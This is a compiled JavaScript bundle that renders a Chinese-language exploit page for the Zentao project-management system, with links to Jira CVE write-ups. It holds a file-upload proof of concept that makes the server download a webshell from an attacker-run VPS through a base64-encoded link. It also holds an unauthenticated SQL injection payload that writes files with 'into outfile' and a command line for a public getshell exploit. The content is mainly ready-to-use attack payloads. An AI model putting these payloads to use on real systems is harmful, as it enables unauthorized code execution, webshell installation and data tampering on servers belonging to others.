(window.webpackJsonp=window.webpackJsonp||[]).push([[89],{813:function(t,e,a){"use strict";a.r(e);var s=a(103),n=Object(s.a)({},(function(){var t=this,e=t.$createElement,a=t._self._c||e;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h2",{attrs:{id:"应用简介"}},[t._v("应用简介 "),a("a",{staticClass:"header-anchor",attrs:{href:"#应用简介"}},[t._v("#")])]),t._v(" "),a("p",[a("a",{attrs:{href:"https://www.zentao.net/",target:"_blank",rel:"noopener noreferrer"}},[t._v("禅道"),a("OutboundLink")],1),t._v(" ，项目管理软件")]),t._v(" "),a("h2",{attrs:{id:"cnvd-c-2020-121325-文件上传"}},[t._v("[CNVD-C-2020-121325]-文件上传 "),a("a",{staticClass:"header-anchor",attrs:{href:"#cnvd-c-2020-121325-文件上传"}},[t._v("#")])]),t._v(" "),a("p",[a("strong",[t._v("漏洞概述")])]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v("#影响范围\nZentao <= 12.4.2 开源版\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[t._v("由于开发者对link参数过滤不严，导致攻击者对下载链接可控，导致可远程下载服务器恶意脚本文件，造成任意代码执行，获取webshell")]),t._v(" "),a("p",[a("strong",[t._v("漏洞利用")])]),t._v(" "),a("p",[t._v("POC")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("http://127.0.0.1/zentao/client-download-1-"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("base64 encode webshell download link"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("-1.html\n\nhttp://127.0.0.1/zentao/data/client/1/"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("download "),a("span",{pre:!0,attrs:{class:"token function"}},[t._v("link")]),t._v(" filename"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[t._v("#这里需要自己开启一个VPS提供下载服务，然后把链接的base64位编码和自己的路径替换一下。")]),t._v("\nhttp://127.0.0.1/zentaopms/www/client-download-1-"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v("<")]),t._v("base64 encode webshell download link"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(">")]),t._v("-1.html\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br")])]),a("p",[t._v("上传位置"),a("code",[t._v("zentaopms\\www\\data\\client\\1")])]),t._v(" "),a("h2",{attrs:{id:"免登录sql注入"}},[t._v("免登录SQL注入 "),a("a",{staticClass:"header-anchor",attrs:{href:"#免登录sql注入"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v("#影响版本\nZentao 9.1.2\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[a("strong",[t._v("漏洞利用")])]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[a("span",{pre:!0,attrs:{class:"token header-name keyword"}},[t._v("http:")]),t._v("//zentao.me/block-main.html?mode=getblockdata&blockid=case¶m=eyJvcmRlckJ5Ijoib3JkZXIgbGltaXQgMTtzZWxlY3QgMTIzIGludG8gb3V0ZmlsZSAnZDoveHh4LnR4dCctLSAtIiwibnVtIjoiMSwxIiwidHlwZSI6Im9wZW5lZGJ5bWUifQ\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("p",[t._v("解码之后如下，因为可以PDO可以多语句，那么就可以update或者写文件操作")]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v('{"orderBy":"order limit 1;select 123 into outfile \'d:/xxx.txt\'-- -","num":"1,1","type":"openedbyme"}\n')])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"前台getshell"}},[t._v("前台Getshell "),a("a",{staticClass:"header-anchor",attrs:{href:"#前台getshell"}},[t._v("#")])]),t._v(" "),a("div",{staticClass:"language-http line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-http"}},[a("code",[t._v("#影响版本\n8.2 - 9.2.1\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br")])]),a("p",[a("strong",[t._v("漏洞利用")])]),t._v(" "),a("p",[t._v("EXP：https://github.com/jas502n/zentao-getshell")]),t._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[t._v("python exp.py http://127.0.0.1:81/ jas502n.php`\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br")])]),a("h2",{attrs:{id:"另一个项目管理软件jira"}},[t._v("另一个项目管理软件Jira "),a("a",{staticClass:"header-anchor",attrs:{href:"#另一个项目管理软件jira"}},[t._v("#")])]),t._v(" "),a("p",[t._v("🔸 "),a("a",{attrs:{href:"https://cloud.tencent.com/developer/article/1529135",target:"_blank",rel:"noopener noreferrer"}},[t._v("Jira服务工作台路径遍历导致的敏感信息泄露漏洞（CVE-2019-14994）"),a("OutboundLink")],1),t._v("\n🔸 "),a("a",{attrs:{href:"https://www.cnblogs.com/backlion/p/11608371.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Jira未授权SSRF漏洞(CVE-2019-8451)"),a("OutboundLink")],1),t._v("\n🔸 "),a("a",{attrs:{href:"https://www.cnblogs.com/backlion/p/11608439.html",target:"_blank",rel:"noopener noreferrer"}},[t._v("Atlassian JIRA服务器模板注入漏洞（CVE-2019-11581）"),a("OutboundLink")],1),t._v("\n🔸 "),a("a",{attrs:{href:"https://xz.aliyun.com/t/7219",target:"_blank",rel:"noopener noreferrer"}},[t._v("CVE-2019-8449 JIRA 信息泄漏漏洞"),a("OutboundLink")],1)])])}),[],!1,null,null,null);e.default=n.exports}}]);